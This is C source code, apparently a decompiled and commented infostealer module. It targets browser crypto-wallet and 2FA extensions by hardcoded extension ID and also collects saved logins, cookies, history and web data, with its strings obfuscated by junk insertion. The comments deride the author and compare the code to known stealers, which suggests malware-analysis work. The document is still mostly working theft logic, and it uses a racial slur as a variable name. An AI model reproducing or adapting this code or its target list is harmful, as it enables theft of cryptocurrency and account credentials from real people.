#include "../HEADER/HEADER.c"

void 
LazyBrowserDataGrabber(LPCWSTR *BrowserAllInfo, 
                      const WCHAR *Filename, 
                      void ***SysInfo)
{
    WCHAR *ExtractedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
    wcscat(ExtractedPath, BrowserAllInfo[1]);
    wcscat(ExtractedPath, L"\\");
    wcscat(ExtractedPath, Filename);
  
    if (verifyFileStatus(ExtractedPath))
    {
        WCHAR *ProcessedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
        wcscat(ProcessedPath, BrowserAllInfo[0]); 
        wcscat(ProcessedPath, L"/");
        wcscat(ProcessedPath, BrowserAllInfo[2]); 
        wcscat(ProcessedPath, L"/");
        wcscat(ProcessedPath, Filename);

        ExtractFileInfoViaNTDLL(ExtractedPath, &Filename, (size_t *)&BrowserAllInfo);
        char *ProcessedData = ProccessingOrMapsTheWideCharacter(ProcessedPath);

        if (BrowserAllInfo)
        {
            ProcessFilePathAndUpdateSession(*SysInfo, ProcessedData);
            blabla((int)*SysInfo, Filename, (unsigned int)BrowserAllInfo);
            blabla_0((char *)*SysInfo);
        }

        free(ProcessedPath);
        free(ExtractedPath);
    }
}

void 
ProcessBrowserExtension(LPCWSTR *BrowserAllInfo, 
                        const WCHAR *extensionIDs, 
                        const WCHAR *WalletName, 
                        void ***SysInfo)
{
    WCHAR *FULLpath = (WCHAR *)calloc(260, sizeof(WCHAR));
    wcscat(FULLpath, BrowserAllInfo[1]);
    wcscat(FULLpath, GetFilePath(L"\\Locedx765al Extensedx765ion Settinedx765gs\\")); 
    wcscat(FULLpath, extensionIDs);

    WCHAR *BrowserDataPath = (WCHAR *)calloc(260, sizeof(WCHAR));
    wcscat(BrowserDataPath, BrowserAllInfo[0]); 
    wcscat(BrowserDataPath, L"/");
    wcscat(BrowserDataPath, BrowserAllInfo[2]); 
    wcscat(BrowserDataPath, GetFilePath(L"/Extedx765ensioedx765ns/")); 
    wcscat(BrowserDataPath, WalletName);

    const WCHAR *TheNigger = GetFilePath(L"*edx765");
    processPath((int)FULLpath, TheNigger, BrowserDataPath, 0, SysInfo);

    free(FULLpath);
    free(BrowserDataPath);
}

void __fastcall 
CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
                    void ***SysInfo)
{ /* CryptoWallrtsAnd2FA - Because skids still cant write original stealers…
 // 
 // lmfao, This function lazily iterates over a hardcoded list of browser extensions, scanning for
 // cryptocurrency wallets and 2FA extensions Looks like another ripoff of RedLine
 // or Raccoon Stealer except written by someone who thinks obfuscating strings with edx765
 // is peak security
 // 
 // Key Observations:
 // - Collects extension IDs and wallet paths like every other skiddy stealer (lol)
 // - Passes them to ProcessBrowserExtension to extract stored credentials and keys
 // - Also grabs login data, cookies, and history (as if this is new)
 // 
 // Seriously, this is just a slightly modified grab and go malware trying to siphon crypto
 // and authentication data. No real innovation, just more recycled garbage*/

  const WCHAR *extensionID, *extensionID_1, *extensionID_2, *extensionID_3, 
  *extensionID_4, *extensionID_5, *extensionID_6, *extensionID_7, *extensionID_8, 
  *extensionID_9, *extensionID_10, *extensionID_11, *extensionID_12, *extensionID_13, 
  *extensionID_14;
  const WCHAR *walletPath; // [esp-8h] [ebp-14h]
  const WCHAR *walletPath_1; // [esp-8h] [ebp-14h]
  const WCHAR *walletPath_2; // [esp-8h] [ebp-14h]
  const WCHAR *walletPath_3; // [esp-8h] [ebp-14h]
  const WCHAR *walletPath_4; // [esp-8h] [ebp-14h]
  const WCHAR *FilePath; // [esp-8h] [ebp-14h]

  walletPath = GetFilePath((wchar_t *)L"Meedx765taMaedx765sk");// // scaning shiti 2FA crypto wallets
  extensionID = GetFilePath((wchar_t *)L"ejbalbakoplchlghecdaedx765lmeeeajnimhm");
  ProcessBrowserExtension(BrowserAllInfo, extensionID, walletPath, SysInfo);
  walletPath_1 = GetFilePath((wchar_t *)L"Meedx765taMaedx765sk");
  extensionID_1 = GetFilePath((wchar_t *)L"nkbihfbeogaeaoehlefedx765nkodbefgpgknn");
  ProcessBrowserExtension(BrowserAllInfo, extensionID_1, walletPath_1, SysInfo);
  walletPath_2 = GetFilePath((wchar_t *)L"Troedx765nLiedx765nk");
  extensionID_2 = GetFilePath((wchar_t *)L"ibnejdfjmmkpcnlpebklmnkoeoihofec");
  ProcessBrowserExtension(BrowserAllInfo, extensionID_2, walletPath_2, SysInfo);
  walletPath_3 = GetFilePath((wchar_t *)L"Ronedx765in Walledx765et");
  extensionID_3 = GetFilePath((wchar_t *)L"fnjhmkhhmkbedx765jkkabndcnnogagogbneec");
  ProcessBrowserExtension(BrowserAllInfo, extensionID_3, walletPath_3, SysInfo);
  walletPath_4 = GetFilePath((wchar_t *)L"Binedx765ance Chaedx765in Waledx765let");
  extensionID_4 = GetFilePath((wchar_t *)L"fhbohimaelbohpjbbldcngcnapnedx765dodjp");
  ProcessBrowserExtension(BrowserAllInfo, extensionID_4, walletPath_4, SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"ffnbelfdoeiohenkjibnmadjiehjhajb", L"Yoroi", SysInfo);// scaning shiti 2FA in Brwsers and others
  ProcessBrowserExtension(BrowserAllInfo, L"jbdaocneiiinmjbjlgalhcelgbejmnid", L"Nifty", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"afbcbjpbpfadlkmhmclhkeeodmamcflc", L"Math", SysInfo);
  FilePath = GetFilePath((wchar_t *)L"Coinbedx765ase");
  extensionID_5 = GetFilePath((wchar_t *)L"hnfanknocfeedx765ofbddgcijnmedx765hnfnkdnaad");
  ProcessBrowserExtension(BrowserAllInfo, extensionID_5, FilePath, SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"hpglfhgfnhbgpjdenjgmdgoeiappafln", L"Guarda", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"blnieiiffboillknjnepogjhkgnoapac", L"EQUAL ", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"cjelfplplebdjjenllpjcblmjkfcffne", L"Jaxx Liberty", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"fihkakfobkmkjojpchpfgcmhfjnmnfpi", L"BitApp ", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"kncchdigobghenbbaddojjnnaogfppfj", L"iWlt", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"amkmjjmmflddogmhpjloimipbofnfjih", L"Wombat", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nlbmnnijcnlegkjjpcfjclmcfggfefdm", L"MEW CX", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nanjmdknhkinifnkgdcggcfnhdaammmj", L"Guild", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nkddgncdjgjfcddamfgcmfnlhccnimig", L"Saturn ", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"cphhlgmgameodnhkjdmkpanlelnlohao", L"NeoLine", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nhnkbkgjikgcigadomkphalanndcapjk", L"Clover ", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"kpfopkelmapcoipemfendmdcghnegimn", L"Liquality ", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"aiifbnbfobpmeekipheeijimdpnlpgpp", L"Terra Station", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"dmkamcknogkgcdfhhbddcghachkejeap", L"Keplr", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"fhmfendgdocmcbmfikdcogofphimnkno", L"Sollet", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"cnmamaachppnkjgnildpdmkaakejnhae", L"Auro", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"jojhfeoedkpkglbfimdfabpdfjaoolaf", L"Polymesh", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"flpiciilemghbmfalicajoolhkkenfel", L"ICONex", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nknhiehlklippafakaeklbeglecifhad", L"Nabox", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"hcflpincpppdclinealmandijcmnkbgn", L"KHC", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"ookjlbkiijinhpmnjffcofjonbfbgaoc", L"Temple", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"mnfifefkajgofkcjkemidiaecocnkjeh", L"TezBox", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"lodccjjbdhfakaekdiahmedfbieldgik", L"DAppPlay", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"ijmpgkjfkbfhoebgogflfebnmejmfbml", L"BitClip", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"lkcjlnjfpbikmcmbachjpdbijejflpcm", L"Steem Keychain", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"onofpnbbkehpmmoabgpcpmigafmmnjhl", L"Nash Extension", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"bcopgchhojmggmffilplmbdicgaihlkp", L"Hycon Lite Client", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"klnaejjgbibmhlephnhpmaofohgkpgkd", L"ZilPay", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"aeachknmefphepccionboohckonoeemg", L"Coin98", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"bhghoamapcdpbohphigoooaddinpkbai", L"Authenticator", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"dkdedlpgdmmkkfjabffeganieamfklkm", L"Cyano", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"nlgbhdfgdhgbiamfdfmbikcdghidoadd", L"Byone", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"infeboajgfhgbjpjbeppbkgnabfdkdaf", L"OneKey", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"cihmoadaighcejopammfbmddcmdekcje", L"Leaf", SysInfo);
  ProcessBrowserExtension(BrowserAllInfo, L"gaedmjdfmmahhbjefcbgaolhhanlaolb", L"Authy", SysInfo);
  extensionID_6 = GetFilePath((wchar_t *)L"Eedx765OS Authentiedx765cator"); // scan Most 2FA
  ProcessBrowserExtension(BrowserAllInfo, L"oeljdldpnmdbchonielidgobddffflal", extensionID_6, SysInfo);
  extensionID_7 = GetFilePath((wchar_t *)L"GAuedx765th Autheedx765nticator");
  ProcessBrowserExtension(BrowserAllInfo, L"ilgcnhelpchnceeipipijaljkblbcobl", extensionID_7, SysInfo);
  extensionID_8 = GetFilePath((wchar_t *)L"Tredx765ezor Passwedx765ord Manager");
  ProcessBrowserExtension(BrowserAllInfo, L"imloifkgjagghnncjkhggdhalmcnfklk", extensionID_8, SysInfo);
  extensionID_9 = GetFilePath((wchar_t *)L"Hisedx765tory"); // scan shiti Passwds and saved stuffs
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_9, SysInfo);
  extensionID_10 = GetFilePath((wchar_t *)L"Loedx765gin Daedx765ta");
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_10, SysInfo);
  extensionID_11 = GetFilePath((wchar_t *)L"Logedx765in Daedx765ta Foedx765r Accedx765ount");
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_11, SysInfo);
  extensionID_12 = GetFilePath((wchar_t *)L"Histedx765ory");
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_12, SysInfo);
  extensionID_13 = GetFilePath((wchar_t *)L"Wedx765eb Daedx765ta");
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_13, SysInfo);
  extensionID_14 = GetFilePath((wchar_t *)L"Netwedx765ork\\Cookedx765ies");
  LazyBrowserDataGrabber(BrowserAllInfo, extensionID_14, SysInfo);
  // what a skidds, lmfao
}
